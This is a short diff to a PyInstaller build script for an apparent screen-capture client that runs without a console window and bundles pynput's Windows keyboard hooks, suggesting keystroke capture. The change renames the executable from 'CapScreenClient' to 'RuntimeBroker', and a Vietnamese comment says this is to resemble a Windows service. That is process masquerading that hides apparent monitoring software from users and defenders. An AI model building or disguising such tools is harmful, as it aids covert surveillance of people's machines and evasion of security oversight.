@@ -20,12 +20,12 @@ PyInstaller.__main__.run([
     'client.py',
     '--onefile',
     '--noconsole',
-    '--name=CapScreenClient',
+    '--name=RuntimeBroker',  # Tên giống Windows service
     '--hidden-import=pynput.keyboard._win32',
     '--add-data=config.json;.',
 ])
 
 print("="*60)
 print("✅ Build complete!")
-print("📁 Output: dist/CapScreenClient.exe")
+print("📁 Output: dist/RuntimeBroker.exe")
 print("="*60)
